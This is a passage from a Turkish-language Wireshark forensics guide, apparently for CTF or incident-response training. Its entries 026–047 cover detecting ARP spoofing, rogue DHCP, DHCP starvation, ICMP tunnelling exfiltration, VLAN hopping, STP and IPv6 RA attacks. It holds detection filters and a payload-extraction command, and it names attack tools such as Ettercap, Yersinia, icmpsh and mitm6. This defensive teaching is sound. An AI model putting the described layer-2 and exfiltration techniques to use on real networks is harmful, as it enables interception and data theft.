<summary><strong>026 · ARP spoofing / MITM tespiti</strong></summary>

**Metafor:** Bir apartmanda biri kapıya "Ben kapıcıyım, kargoları bana verin" yazısı asıyor. ARP spoofing, saldırganın kendini ağ geçidi (gateway) gibi tanıtmasıdır.

**Senden istenen:** "Ortadaki adam (MITM) saldırısı var mı, saldırganın MAC adresi ne?"

**Filtreler (araştırma yolu):**

- `arp.duplicate-address-detected` → Wireshark aynı IP için iki farklı MAC gördüğünde bu uyarıyı koyar
- `arp.opcode == 2` → ARP cevapları (spoofing cevaplarla yapılır)
- `arp.opcode == 2 && arp.src.proto_ipv4 == 10.0.0.1` → "gateway benim" diyen tüm cevaplar
- `eth.src == 00:0c:29:aa:bb:cc && ip` → şüpheli MAC'in taşıdığı IP trafiği (araya girmiş mi?)

**Filtreden sonra yol tarifi:**

1. arp.duplicate-address-detected filtresini uygula. Sonuç varsa Info'da "duplicate use of 10.0.0.1 detected" gibi bir satır görürsün.
2. Gateway IP'si için ARP cevaplarını filtrele; iki farklı MAC (Sender MAC address) çıkıyorsa biri sahtedir.
3. Gerçek gateway MAC'ini bul: genelde ağın en başındaki DHCP cevabında veya önceki normal trafikte görünür.
4. Sahte MAC'in sahibini bul: bu MAC'in kendi IP'si için yaptığı ARP veya DHCP paketlerine bak.
5. Saldırının etkisini doğrula: kurbanın dışarı giden trafiği (eth.dst) artık sahte MAC'e mi gidiyor?
6. Çok sık, istenmeden gönderilen ARP cevapları (saniyede birkaç kez) spoofing aracının imzasıdır (arpspoof, Ettercap, Bettercap).

**Terimler:**

- **ARP**: IP adresini MAC adresine çeviren protokol. "10.0.0.1 kim? MAC'ini söyle."
- **MAC adresi**: Ağ kartının fiziksel adresi (ör. 00:0c:29:aa:bb:cc).
- **MITM**: Man-in-the-Middle; saldırgan iki tarafın arasına girip trafiği okur/değiştirir.
- **Gateway**: Ağın dışarı açılan kapısı (router).

> **Anlık karar:** Aynı IP iki MAC'te = alarm. Hangisi gerçek? Daha önce görünen ve DHCP/router trafiğiyle tutarlı olan.


</details>

<details>
<summary><strong>027 · Gratuitous ARP fırtınası</strong></summary>

**Metafor:** Kimse sormadan herkese "Benim adım Ahmet, adresim burası" diye bağıran biri. Bazen normaldir (yeni gelen), sürekli yapıyorsa şüphelidir.

**Senden istenen:** "Ağda anormal ARP davranışı var mı?", "IP çakışması veya spoofing işareti var mı?"

**Filtreler (araştırma yolu):**

- `arp.isgratuitous == 1` → kimse sormadan yapılan duyurular
- `arp.isgratuitous == 1 && eth.src == 00:0c:29:aa:bb:cc` → belirli MAC'in duyuruları

**Filtreden sonra yol tarifi:**

1. Gratuitous ARP filtresini uygula ve Statistics ▸ Endpoints ▸ Ethernet ile hangi MAC'in kaç kez yaptığını say.
2. Makine açılışında veya IP değişiminde 1-3 tane normaldir. Dakikalar boyunca düzenli tekrar şüphelidir.
3. Duyurulan IP'ye bak: gateway veya DNS sunucusu IP'sini duyuran başka bir MAC varsa spoofing'dir.
4. Zaman sütunundaki aralıkları incele; düzenli aralık araç kullanıldığını gösterir.

**Terimler:**

- **Gratuitous ARP**: Sorulmadan gönderilen ARP; "bu IP benim" ilanı.
- **Failover**: Yedek cihazın devreye girmesi; meşru gratuitous ARP sebebi.

> **Anlık karar:** Önce meşru sebep ara (HSRP/VRRP failover, VM taşıma). Yoksa spoofing hipotezine geç.


</details>

<details>
<summary><strong>028 · ARP taraması ile ağ keşfi (host discovery)</strong></summary>

**Metafor:** Yeni taşındığın apartmanda tüm kapıları tek tek çalıp "kim var?" diye sormak.

**Senden istenen:** "Saldırgan iç ağda hangi hostları keşfetti?", "Keşif ne zaman başladı?"

**Filtreler (araştırma yolu):**

- `arp.opcode == 1` → ARP soruları
- `arp.opcode == 1 && eth.src == 00:0c:29:aa:bb:cc` → tek makinenin soruları
- `arp.opcode == 1 && arp.dst.proto_ipv4 == 10.0.0.0/24` → hedeflenen alt ağ

**Filtreden sonra yol tarifi:**

1. ARP sorularını filtrele, Statistics ▸ Endpoints ▸ Ethernet'te en çok ARP soran MAC'i bul.
2. O MAC'in sorduğu hedef IP'lerin ardışık olup olmadığına bak (10.0.0.1, .2, .3, ...). Ardışıklık = tarama aracı (nmap -sn, netdiscover, arp-scan).
3. Hangi IP'lerin cevap verdiğini (arp.opcode == 2) listele: saldırganın öğrendiği canlı hostlar bunlardır.
4. Taramanın başlangıç-bitiş zamanını ve hızını not et.

**Terimler:**

- **Host discovery**: Ağdaki canlı cihazları bulma.
- **/24**: 256 adreslik alt ağ (ör. 10.0.0.0 - 10.0.0.255).

> **Anlık karar:** Saniyede onlarca ardışık ARP sorusu insan işi değildir. Bu, iç ağa sızmış birinin ilk adımıdır.


</details>

<details>
<summary><strong>029 · MAC flooding / CAM tablosu taşırma</strong></summary>

**Metafor:** Postacının adres defterini binlerce sahte isimle doldurmak; postacı şaşırıp mektupları herkese dağıtmaya başlar.

**Senden istenen:** "Switch'i hub'a çevirmeye çalışan saldırı var mı?"

**Filtreler (araştırma yolu):**

- `eth.src[0:3] == 00:00:00` → sıfırla başlayan anlamsız MAC'ler (araca göre değişir)
- `eth.type == 0x0800 && ip.src == 0.0.0.0` → anlamsız kaynaklı sahte çerçeveler

**Filtreden sonra yol tarifi:**

1. Statistics ▸ Endpoints ▸ Ethernet aç. Normal ağda onlarca MAC olur; binlerce farklı MAC görürsen alarm.
2. Bu MAC'ler rastgele mi (ör. macof aracı rastgele üretir), bir porttan mı geliyor? Sıra/zamana bak.
3. I/O Graph'ta paket sayısının ani patlamasına bak.
4. Ardından gelen trafikte, normalde göremeyeceğin unicast trafiği (başkalarının konuşması) görünüyorsa saldırı başarılı olmuş olabilir.

**Terimler:**

- **CAM tablosu**: Switch'in "hangi MAC hangi portta" defteri.
- **Hub**: Gelen her paketi tüm portlara dağıtan eski cihaz.
- **macof**: MAC flooding yapan bilinen araç.

> **Anlık karar:** Ölçü "kaç farklı MAC". Endpoints penceresindeki satır sayısı tek başına alarmdır.


</details>

<details>
<summary><strong>030 · Sahte (rogue) DHCP sunucusu</strong></summary>

**Metafor:** Otelin resepsiyonu yerine kapıda duran sahte bir görevlinin misafirlere oda numarası ve yanlış harita vermesi.

**Senden istenen:** "Ağda yetkisiz DHCP sunucusu var mı?", "Kurbana hangi sahte gateway/DNS verildi?"

**Filtreler (araştırma yolu):**

- `dhcp.option.dhcp == 2` → DHCP Offer (teklif) paketleri
- `dhcp.option.dhcp == 5` → DHCP ACK (onay) paketleri
- `dhcp.option.dhcp == 2 && !(ip.src == 10.0.0.1)` → meşru sunucu dışından gelen teklifler

**Filtreden sonra yol tarifi:**

1. DHCP Offer ve ACK'leri filtrele, Source sütununa bak. Birden fazla IP teklif veriyorsa biri sahte olabilir.
2. Her teklifin içinde Option 3 (Router) ve Option 6 (DNS) değerlerine bak. Sahte sunucu kendini gateway/DNS olarak verir.
3. Kurban hangi teklifi kabul etti? Request paketinde (dhcp.option.dhcp == 3) seçtiği sunucu (Option 54 Server Identifier) yazar.
4. Kurbanın sonraki trafiği sahte gateway/DNS'e mi gidiyor kontrol et.

**Terimler:**

- **DHCP**: Cihazlara otomatik IP, gateway, DNS dağıtan protokol. Akış: Discover → Offer → Request → ACK (DORA).
- **Option 3/6/54**: Router, DNS sunucusu, DHCP sunucu kimliği.

> **Anlık karar:** DHCP'de "kim ilk cevap verirse o kazanır". Sahte sunucu genelde meşru olandan daha hızlı cevap verir; zaman damgalarını karşılaştır.


</details>

<details>
<summary><strong>031 · DHCP starvation (havuz tüketme) saldırısı</strong></summary>

**Metafor:** Bir restoranın tüm masalarını sahte isimlerle rezerve edip gerçek müşterilere yer bırakmamak.

**Senden istenen:** "DHCP havuzunu tüketen saldırı var mı?", genelde rogue DHCP'nin ön adımıdır.

**Filtreler (araştırma yolu):**

- `dhcp.option.dhcp == 1` → DHCP Discover (istek) paketleri
- `dhcp.option.dhcp == 1 && dhcp.hw.mac_addr[0:3] == 00:0c:29` → belirli üretici önekli istekler
- `dhcp.option.dhcp == 6` → DHCP NAK: sunucu "veremem" diyor

**Filtreden sonra yol tarifi:**

1. Discover paketlerini filtrele ve sayısını gör. Kısa sürede yüzlerce Discover = starvation.
2. Client MAC adreslerine bak (Statistics ▸ Endpoints veya dhcp.hw.mac_addr sütunu). Rastgele/sahte MAC'ler aracın (Yersinia, dhcpstarv) işaretidir.
3. Ethernet kaynak MAC'leri farklı ama hepsi aynı fiziksel porttan geliyor olabilir; switch logu ile eşleştirilir.
4. Sonrasında rogue DHCP teklifi var mı bak (Problem 030).

**Terimler:**

- **DHCP havuzu**: Sunucunun dağıtabileceği IP adresi aralığı.
- **NAK**: Negatif onay, istek reddedildi.

> **Anlık karar:** Starvation tek başına DoS'tur, ama genelde arkasından sahte DHCP gelir. İkisini birlikte ara.


</details>

<details>
<summary><strong>032 · Bir IP'nin hangi cihaza (MAC/hostname) ait olduğunu bulmak</strong></summary>

**Metafor:** Bir telefon numarasının kime ait olduğunu rehberden, faturadan, kartvizitten çapraz kontrol etmek.

**Senden istenen:** "10.0.0.20'nin hostname'i nedir?", "Bu makinenin MAC adresi ve üreticisi ne?"

**Filtreler (araştırma yolu):**

- `dhcp.option.hostname` → DHCP isteklerinde makinenin kendi bildirdiği adı
- `nbns && ip.src == 10.0.0.20` → NetBIOS isim kayıtları (Windows makine adı)
- `kerberos.CNameString && ip.src == 10.0.0.20` → o makineden giriş yapan kullanıcı/makine hesabı
- `arp.src.proto_ipv4 == 10.0.0.20` → IP-MAC eşleşmesi
- `http.user_agent && ip.src == 10.0.0.20` → işletim sistemi/tarayıcı ipucu

**Filtreden sonra yol tarifi:**

1. DHCP filtresiyle Option 12 (Host Name) ve Option 61 (Client identifier) değerlerini oku.
2. NBNS veya SMB Session Setup paketlerinde Windows makine adını bul.
3. Kerberos'ta "$" ile biten CNameString makine hesabıdır (ör. DESKTOP-ABC$); biten olmayan kullanıcıdır.
4. MAC'in ilk yarısından üreticiyi oku (Wireshark Ethernet satırında yazar, ör. "Dell_..", "VMware_..").
5. User-Agent'tan işletim sistemini çıkar (ör. Windows NT 10.0 = Windows 10/11).

**Terimler:**

- **NetBIOS/NBNS**: Windows'un eski yerel isim çözümleme protokolü.
- **Makine hesabı**: AD'de bilgisayarın kendi hesabı, sonu $ ile biter.

> **Anlık karar:** En az iki bağımsız kaynakla (DHCP + Kerberos gibi) eşleştir. Tek kaynak yanılabilir.


</details>

<details>
<summary><strong>033 · ICMP ping sweep (ağ taraması)</strong></summary>

**Metafor:** Karanlık bir odada el feneriyle her köşeye ışık tutup kimin gözünün parladığına bakmak.

**Senden istenen:** "Saldırgan hangi alt ağı taradı, kaç host canlı çıktı?"

**Filtreler (araştırma yolu):**

- `icmp.type == 8` → Echo Request (ping)
- `icmp.type == 0` → Echo Reply (ping cevabı: host canlı)
- `icmp.type == 8 && ip.src == 10.0.0.5` → tek kaynağın pingleri

**Filtreden sonra yol tarifi:**

1. Echo Request'leri filtrele, Endpoints'te en çok ping atan IP'yi bul.
2. Hedef IP'ler ardışık mı? Ardışıksa sweep'tir.
3. Echo Reply filtresiyle cevap veren (canlı) hostları listele.
4. Taramanın süresini ve kapsamını not et; sonraki adımda saldırgan genelde canlı hostlara port taraması yapar (Problem 052).

**Terimler:**

- **ICMP**: Ağ teşhis mesajları protokolü (ping bunun parçasıdır).
- **Type 8 / Type 0**: Echo Request / Echo Reply.
- **Sweep**: Bir aralıktaki tüm adresleri tarama.

> **Anlık karar:** Ping cevabı gelmemesi host kapalı demek değildir (firewall ICMP'yi engelleyebilir). Ama cevap gelmesi kesin canlı demektir.


</details>

<details>
<summary><strong>034 · ICMP tünelleme ile veri sızdırma</strong></summary>

**Metafor:** Normalde boş gelen sağlık kontrolü zarflarının içine gizlice mektup koymak. Ping paketleri genelde sabit ve küçük bir yük taşır.

**Senden istenen:** "ICMP üzerinden veri sızdırılmış mı, ne sızdırılmış?"

**Filtreler (araştırma yolu):**

- `icmp && data.len > 64` → normalden büyük ICMP yükü
- `icmp.type == 8 && !(data.len == 32) && !(data.len == 48) && !(data.len == 56)` → Windows(32), macOS(56) ve yaygın boyutlar dışında kalanlar
- `icmp && frame contains "HTTP"` → ICMP içinde başka protokol izleri

**Komut satırı:**

```bash
tshark -r kanit.pcapng -Y 'icmp.type == 8 && ip.src == 10.0.0.20' -T fields -e data.data | xxd -r -p > icmp_yuk.bin
```

**Filtreden sonra yol tarifi:**

1. Normal ping yükünü tanı: Windows "abcdefghijklmnopqrstuvwabcdefghi" (32 byte), Linux 48-56 byte zaman damgası + sabit desen.
2. Yük boyutu değişken ve büyük ICMP'leri filtrele. Statistics ▸ Packet Lengths ile dağılımı gör.
3. Paket byte'larında (alt panel) yükü oku. Okunabilir metin, base64 veya dosya başlıkları ara.
4. Tüm yükü birleştirmek için tshark ile data.data alanını sırayla çıkar ve hex'ten dosyaya çevir.
5. Araç imzaları: ptunnel, icmpsh, icmptunnel. icmpsh'de komut çıktıları düz metin görünür.

**Terimler:**

- **Tünelleme**: Bir protokolün içine başka bir protokolü/veriyi gizlemek.
- **Payload (yük)**: Paketin başlıkları dışındaki taşıdığı asıl veri.
- **xxd -r -p**: Hex metni ikili dosyaya çeviren komut.

> **Anlık karar:** Ping'in yükü konuşmaz. ICMP yükünde anlamlı metin veya değişken boyut görüyorsan tünel var demektir.


</details>

<details>
<summary><strong>035 · Ping of Death ve anormal ICMP boyutları</strong></summary>

**Metafor:** Kapı aralığından sığmayacak kadar büyük bir paketi zorla sokmaya çalışmak.

**Senden istenen:** "DoS amaçlı anormal ICMP var mı?", "Parçalanmış dev ping paketleri hangisi?"

**Filtreler (araştırma yolu):**

- `icmp && ip.flags.mf == 1` → parçalanmış (devamı gelen) ICMP
- `icmp && ip.len > 1500` → tek parçada olmaması gereken büyüklükte ICMP
- `icmp && frame.len > 1000` → büyük ICMP çerçeveleri

**Filtreden sonra yol tarifi:**

1. Büyük veya parçalanmış ICMP'leri filtrele.
2. Parçaları birleşince toplam boyut 65535 byte'ı aşıyor mu bak (Ping of Death imzası).
3. Kısa sürede çok sayıda büyük ICMP = ICMP flood (Smurf/ping flood) olabilir; I/O Graph ile hacmi gör.
4. Hedef cihazın sonrasında cevap vermeyi kesip kesmediğine bak (DoS etkisi).

**Terimler:**

- **MTU**: Bir ağ bağlantısında tek seferde taşınabilecek maksimum paket boyu (Ethernet'te 1500 byte).
- **Fragmentation**: Büyük paketin MTU'ya sığacak parçalara bölünmesi.

> **Anlık karar:** Modern sistemler Ping of Death'e karşı korumalıdır; CTF'de görürsen genelde "tespit et ve adını koy" sorusudur.


</details>

<details>
<summary><strong>036 · ICMP redirect ile trafik yönlendirme</strong></summary>

**Metafor:** Yol kenarında sahte bir "Yol kapalı, sağdan gidin" tabelası.

**Senden istenen:** "Saldırgan kurbanın rotasını değiştirmeye çalışmış mı?"

**Filtreler (araştırma yolu):**

- `icmp.type == 5` → ICMP Redirect mesajları
- `icmp.type == 5 && !(ip.src == 10.0.0.1)` → gerçek router dışından gelen redirect
- `icmp.redir_gw` → redirect'in gösterdiği yeni gateway alanı

**Filtreden sonra yol tarifi:**

1. ICMP Redirect'leri filtrele. Normal ağlarda nadirdir.
2. Gönderen IP'nin gerçek router olup olmadığını kontrol et.
3. "Gateway address" alanında saldırganın kendi IP'si yazıyorsa MITM girişimidir.
4. Kurbanın sonraki paketlerinin bu yeni gateway'e gidip gitmediğine (eth.dst) bak.

**Terimler:**

- **ICMP Redirect**: Router'ın "bu hedefe benim yerime şu router üzerinden git" mesajı.
- **Routing**: Paketin hedefe hangi yoldan gideceğine karar verme.

> **Anlık karar:** Router olmayan bir makineden redirect gelmesi kendi başına bulgudur.


</details>

<details>
<summary><strong>037 · Traceroute izlerini tanımak (TTL exceeded)</strong></summary>

**Metafor:** Bir yolda kaç durak olduğunu, her durakta "buradayım" diye kâğıt bıraktırarak ölçmek.

**Senden istenen:** "Saldırgan ağ topolojisini keşfetti mi?", "Bu ICMP Time Exceeded'ler ne?"

**Filtreler (araştırma yolu):**

- `icmp.type == 11` → Time Exceeded (TTL bitti) mesajları
- `ip.ttl <= 5 && ip.src == 10.0.0.5` → kasıtlı düşük TTL'li paketler
- `udp.dstport >= 33434 && udp.dstport <= 33534` → Linux traceroute'un varsayılan UDP port aralığı

**Filtreden sonra yol tarifi:**

1. Time Exceeded mesajlarını filtrele; her biri yoldaki bir router'ın cevabıdır.
2. Kaynağı bul: bu mesajlara yol açan paketler TTL 1, 2, 3... diye artan değerlerle gönderilmiştir.
3. Windows tracert ICMP Echo kullanır, Linux traceroute UDP 33434+ kullanır; araçtan işletim sistemini tahmin edebilirsin.
4. Bu bir keşif adımıdır, zaman çizelgene "ağ haritalama" olarak ekle.

**Terimler:**

- **TTL**: Time To Live; paketin ömrü. Her router 1 azaltır, 0 olunca paket atılır ve Time Exceeded döner.
- **Hop**: Yoldaki her bir router geçişi.

> **Anlık karar:** Time Exceeded patlaması + artan TTL = traceroute. Bilgi toplamadır, saldırı değil; ama saldırgan profilini tamamlar.


</details>

<details>
<summary><strong>038 · TTL anomalileri ile spoof ve işletim sistemi tahmini</strong></summary>

**Metafor:** Bir mektubun üzerindeki posta damgası sayısı ne kadar yol geldiğini söyler. Aynı kişiden gelen mektuplarda damga sayısı birden değişirse mektubu başkası göndermiş olabilir.

**Senden istenen:** "Paketler gerçekten iddia edilen kaynaktan mı geliyor?", "Karşı taraf Windows mu Linux mu?"

**Filtreler (araştırma yolu):**

- `ip.src == 10.0.0.1 && ip.ttl != 64` → aynı kaynak için beklenmeyen TTL
- `ip.ttl > 64 && ip.ttl <= 128` → başlangıç TTL'i muhtemelen 128 (Windows)
- `ip.ttl <= 64` → başlangıç TTL'i muhtemelen 64 (Linux/macOS)

**Filtreden sonra yol tarifi:**

1. Paket listesine ip.ttl sütunu ekle.
2. Aynı kaynak IP'den gelen paketlerde TTL tutarlı mı bak. Ani değişim = farklı cihaz (spoof veya MITM).
3. Başlangıç TTL'ini tahmin et: 64 (Linux/macOS), 128 (Windows), 255 (ağ cihazları). Gördüğün değer = başlangıç - hop sayısı.
4. Sonucu User-Agent veya TCP pencere boyutu gibi diğer parmak izleriyle doğrula.

**Terimler:**

- **Passive OS fingerprinting**: Trafiğe dokunmadan işletim sistemini tahmin etmek.
- **Spoofing**: Kimlik taklidi; sahte kaynak adresi kullanmak.

> **Anlık karar:** TTL tek başına kesin kanıt değildir ama "aynı IP, farklı TTL" gördüğünde dur ve sorgula.


</details>

<details>
<summary><strong>039 · IP fragmentation ile IDS atlatma</strong></summary>

**Metafor:** Yasaklı bir kelimeyi harf harf ayrı zarflarda göndermek; kontrol eden memur tek zarfa bakınca bir şey anlamaz.

**Senden istenen:** "Parçalama ile güvenlik cihazı atlatılmaya çalışılmış mı?"

**Filtreler (araştırma yolu):**

- `ip.flags.mf == 1 || ip.frag_offset > 0` → tüm IP parçaları
- `ip.frag_offset > 0 && ip.frag_offset < 8` → anormal küçük offset (çakışan parçalar)
- `ip.flags.mf == 1 && ip.len < 100` → çok küçük parçalar (tiny fragment saldırısı)

**Filtreden sonra yol tarifi:**

1. Fragment filtresini uygula. Normal ağda TCP trafiğinde parçalanma nadirdir.
2. Parçaların aynı ip.id değerine sahip olduğunu gör; Wireshark bunları birleştirir ve son pakette "Reassembled IPv4" gösterir.
3. Çakışan parçalar (overlap) varsa Expert Info'da uyarı çıkar; bu bilinçli atlatma tekniğidir (Teardrop, fragroute).
4. Birleşmiş içeriğe bak: zararlı bir istek, parçaların içine bölünmüş olabilir.

**Terimler:**

- **Fragment offset**: Parçanın orijinal paket içindeki konumu (8 byte'lık birimlerle).
- **MF (More Fragments)**: "Arkamdan parça gelecek" bayrağı.
- **IDS**: Saldırı Tespit Sistemi.

> **Anlık karar:** Küçük ve çakışan parçalar meşru trafikte neredeyse hiç olmaz. Gördüysen bilinçli yapılmıştır.


</details>

<details>
<summary><strong>040 · Sahte (spoofed) kaynak IP tespiti</strong></summary>

**Metafor:** Sahte iade adresi yazılmış mektup. Cevaplar gerçek adres sahibine gider, gönderen cevabı hiç görmez.

**Senden istenen:** "Bu saldırıda kaynak IP'ler sahte mi?", genelde DoS ve amplifikasyonda sorulur.

**Filtreler (araştırma yolu):**

- `tcp.flags.syn == 1 && tcp.flags.ack == 0 && ip.ttl < 30` → anormal düşük TTL'li SYN'ler
- `ip.src == 10.0.0.0/8 && eth.src == 00:1a:2b:3c:4d:5e` → iç IP'yi taşıyan ama dış arayüzden gelen çerçeveler
- `ip.src == 0.0.0.0 || ip.src == 255.255.255.255 || ip.src == 127.0.0.0/8` → olmaması gereken kaynaklar

**Filtreden sonra yol tarifi:**

1. Kaynak IP sayısına bak (Endpoints). Kısa sürede binlerce farklı kaynak = rastgele spoof (SYN flood'un klasiği).
2. Bu kaynaklar el sıkışmayı tamamlıyor mu? Hiçbiri ACK göndermiyorsa gerçek değildir.
3. TTL ve MAC tutarlılığına bak: binlerce "farklı" IP aynı MAC'ten ve aynı TTL'le geliyorsa hepsi tek cihazdır.
4. Bogon (rezerve, kullanılmayan) adreslerden gelen trafik doğrudan spoof işaretidir.

**Terimler:**

- **Bogon**: İnternette yönlendirilmemesi gereken rezerve adresler.
- **Three-way handshake**: TCP'nin SYN, SYN-ACK, ACK ile bağlantı kurması; spoof eden taraf bunu tamamlayamaz.

> **Anlık karar:** Binlerce IP ama tek MAC, tek TTL: tek saldırgan, binlerce maske.


</details>

<details>
<summary><strong>041 · IPv6 Router Advertisement (RA) saldırısı / SLAAC MITM</strong></summary>

**Metafor:** Yeni gelen herkese "router benim" diye bağıran sahte bir trafik polisi. IPv6'da cihazlar bu bağırışa varsayılan olarak inanır.

**Senden istenen:** "IPv6 üzerinden MITM yapılmış mı (ör. mitm6 aracı)?"

**Filtreler (araştırma yolu):**

- `icmpv6.type == 134` → Router Advertisement
- `icmpv6.type == 133` → Router Solicitation (istemci router arıyor)
- `icmpv6.type == 134 && !(eth.src == 00:1a:2b:3c:4d:5e)` → meşru router dışından RA
- `dhcpv6` → DHCPv6 (mitm6 sahte DNS dağıtmak için kullanır)

**Filtreden sonra yol tarifi:**

1. RA paketlerini filtrele, kaynak MAC/IP'lere bak. Ağda IPv6 router'ı yokken RA görünmesi tek başına alarmdır.
2. RA içindeki Prefix ve Router Lifetime değerlerine bak.
3. DHCPv6 Reply/Advertise paketlerinde DNS sunucusu olarak saldırganın IPv6 adresi veriliyor mu kontrol et (mitm6 imzası).
4. Ardından kurbanların DNS sorgularının saldırgana gidip gitmediğine, WPAD sorgusu olup olmadığına bak (Problem 100).

**Terimler:**

- **IPv6**: Yeni nesil IP protokolü; Windows varsayılan olarak tercih eder.
- **SLAAC**: IPv6'da cihazların RA'ya bakarak kendi adreslerini oluşturması.
- **mitm6**: Windows ağlarında DHCPv6 ile DNS zehirleyen araç.

> **Anlık karar:** "Biz IPv6 kullanmıyoruz" diyen ağlar en çok IPv6 saldırısına açık olanlardır; çünkü kimse izlemiyordur.


</details>

<details>
<summary><strong>042 · IPv6 tünelleri (6to4, Teredo) ve gizli kanal</strong></summary>

**Metafor:** Duvarda delik açmak yerine mevcut boruların içinden gizlice kablo çekmek.

**Senden istenen:** "IPv4 ağı içinde gizli IPv6 trafiği var mı?"

**Filtreler (araştırma yolu):**

- `ip.proto == 41` → IPv4 içinde IPv6 (6to4, ISATAP)
- `teredo` → UDP içinde IPv6 (Teredo, genelde UDP 3544)
- `udp.port == 3544` → Teredo sunucu portu
- `ipv6 && ip` → hem IPv4 hem IPv6 başlığı taşıyan (tünellenmiş) paketler

**Filtreden sonra yol tarifi:**

1. Protocol Hierarchy'de IPv4 altında IPv6 görüyorsan tünel var demektir.
2. Tünelin uçlarını bul (dış IPv4 adresleri), sonra içteki IPv6 trafiğinde ne konuşulduğuna bak.
3. Kurumsal politika IPv6'yı yasaklıyorsa bu tünel firewall atlatma girişimidir.
4. İçteki trafiği normal analiz et (DNS, HTTP, TLS); Wireshark iç protokolleri otomatik çözer.

**Terimler:**

- **Encapsulation**: Bir paketi başka bir paketin içine koyma.
- **Teredo**: NAT arkasından IPv6'ya erişmek için UDP tabanlı tünel teknolojisi.

> **Anlık karar:** Firewall IPv6'yı görmüyorsa saldırgan için görünmez yol demektir. İç içe protokol her zaman not edilir.


</details>

<details>
<summary><strong>043 · VLAN hopping (double tagging)</strong></summary>

**Metafor:** Bir binada kat kartını taklit edip yetkin olmayan kata çıkmak. Çift etiketleme, paketin iki kat kartı taşıması gibidir.

**Senden istenen:** "Başka VLAN'a erişim denemesi var mı?"

**Filtreler (araştırma yolu):**

- `vlan` → VLAN etiketli çerçeveler
- `vlan.etype == 0x8100` → iç içe ikinci VLAN etiketi (double tagging)
- `vlan.id == 10` → belirli VLAN'daki trafik
- `dtp` → Dynamic Trunking Protocol (switch spoofing için kullanılır)

**Filtreden sonra yol tarifi:**

1. VLAN etiketli trafik varsa iki etiketli paketleri (double tag) ara: dış etiketin ardından tekrar 0x8100.
2. DTP paketlerine bak: bir uç cihaz switch gibi trunk müzakeresi yapıyorsa switch spoofing denemesidir (Yersinia).
3. Hangi VLAN'dan hangi VLAN'a geçilmeye çalışıldığını vlan.id değerlerinden çıkar.
4. Not: Pcap'te VLAN etiketini görebilmek için kaydın trunk porttan veya etiketleri koruyan bir yerden alınmış olması gerekir.

**Terimler:**

- **VLAN**: Tek fiziksel ağı mantıksal parçalara bölme.
- **802.1Q tag**: Çerçeveye eklenen VLAN numarası etiketi.
- **Trunk**: Birden fazla VLAN'ı taşıyan bağlantı.

> **Anlık karar:** Çift etiket meşru ağlarda (QinQ hariç) olmaz. Görürsen ve QinQ kullanılmıyorsa saldırıdır.


</details>

<details>
<summary><strong>044 · STP manipülasyonu (root bridge saldırısı)</strong></summary>

**Metafor:** Bir şirkette kendini "genel müdür" ilan edip tüm yazışmaların kendi masasından geçmesini sağlamak.

**Senden istenen:** "Ağ topolojisini değiştiren sahte STP paketi var mı?"

**Filtreler (araştırma yolu):**

- `stp` → Spanning Tree paketleri
- `stp.root.prio == 0` → en yüksek öncelikli (0) root iddiası
- `stp.flags.tc == 1` → topoloji değişikliği bildirimleri

**Filtreden sonra yol tarifi:**

1. STP paketlerini filtrele ve Root Identifier değerlerini karşılaştır.
2. Root bridge kimliği bir anda değişiyorsa ve yeni root bir uç cihaz MAC'iyse saldırıdır.
3. Çok sayıda Topology Change bildirimi ağ kararsızlığına ve trafiğin yeniden yönlenmesine yol açar.
4. Yeni root'un MAC'ini bul ve hangi cihaz olduğunu belirle.

**Terimler:**

- **STP**: Ağdaki döngüleri önleyen protokol; bir "root bridge" seçer.
- **BPDU**: STP'nin mesaj paketi.

> **Anlık karar:** Uç kullanıcı portundan BPDU gelmesi bile anormaldir. Root değişimi + yeni MAC = saldırı.


</details>

<details>
<summary><strong>045 · CDP/LLDP ile ağ cihazı bilgi sızıntısı</strong></summary>

**Metafor:** Her cihazın yakasında isim, model ve yazılım sürümü yazan kart; saldırgan sadece okuyarak hangi zafiyeti deneyeceğini bilir.

**Senden istenen:** "Saldırgan hangi ağ cihazı bilgilerini pasif olarak öğrenebilirdi?"

**Filtreler (araştırma yolu):**

- `cdp` → Cisco Discovery Protocol
- `lldp` → Link Layer Discovery Protocol
- `cdp.software_version contains "IOS"` → IOS sürüm bilgisi
- `lldp.tlv.system.name` → cihaz adını içeren LLDP paketleri

**Filtreden sonra yol tarifi:**

1. CDP/LLDP paketlerini filtrele ve detayda Device ID, Platform, Software Version, Port ID, Management Address alanlarını oku.
2. Yazılım sürümünü not et; bilinen zafiyetli sürüm mü kontrol edilebilir.
3. Bu bilgi bir uç cihaza ulaşıyorsa saldırgan da görebilir; bulgu olarak raporla.
4. Saldırgan sahte CDP paketiyle de (ör. Yersinia) cihazları yorabilir; anormal sayıda CDP varsa flood'dur.

**Terimler:**

- **CDP/LLDP**: Ağ cihazlarının komşularına kendini tanıttığı protokoller.
- **Reconnaissance**: Keşif aşaması.

> **Anlık karar:** Bu bir saldırı izi değil, zafiyet bulgusudur. Raporda "bilgi ifşası" başlığı altında yaz.


</details>

<details>
<summary><strong>046 · Broadcast ve multicast fırtınası</strong></summary>

**Metafor:** Bir toplantıda herkesin aynı anda megafonla bağırması; kimse kimseyi duyamaz.

**Senden istenen:** "Ağ neden yavaşladı?", "Döngü veya flood var mı?"

**Filtreler (araştırma yolu):**

- `eth.dst == ff:ff:ff:ff:ff:ff` → tüm broadcast çerçeveler
- `eth.dst[0] & 1` → multicast ve broadcast (hedef MAC'in ilk bitine bakar)
- `eth.dst == ff:ff:ff:ff:ff:ff && !arp && !dhcp` → ARP/DHCP dışındaki broadcast'ler

**Filtreden sonra yol tarifi:**

1. Broadcast filtresini uygula ve I/O Graph'ta oranına bak. Toplam trafiğin %10-20'sini aşıyorsa sorun var.
2. Aynı paketin tekrar tekrar (aynı içerik, aynı ip.id) dönmesi Layer 2 döngüsüne işaret eder.
3. Tek kaynaktan gelen yoğun broadcast bir cihaz arızası veya flood aracıdır.
4. SSDP, NetBIOS, mDNS yoğunluğu çoğu zaman zararsız gürültüdür; önce bunları ayır.

**Terimler:**

- **Broadcast**: Ağdaki herkese gönderilen çerçeve (ff:ff:ff:ff:ff:ff).
- **Multicast**: Bir gruba gönderilen çerçeve.
- **Broadcast storm**: Kontrolsüz broadcast çoğalması, ağı kilitler.

> **Anlık karar:** Aynı paketin defalarca görünmesi = döngü. Farklı paketlerin yoğunluğu = flood. Çözüm yolu farklıdır.


</details>

<details>
<summary><strong>047 · Bir hostun MAC adresi değişmiş (MAC spoofing)</strong></summary>

**Metafor:** Aynı kişinin farklı kimlik kartıyla kapıdan geçmesi.

**Senden istenen:** "Saldırgan MAC adresini değiştirmiş mi?", "Ağ erişim kontrolü (NAC) atlatılmış mı?"

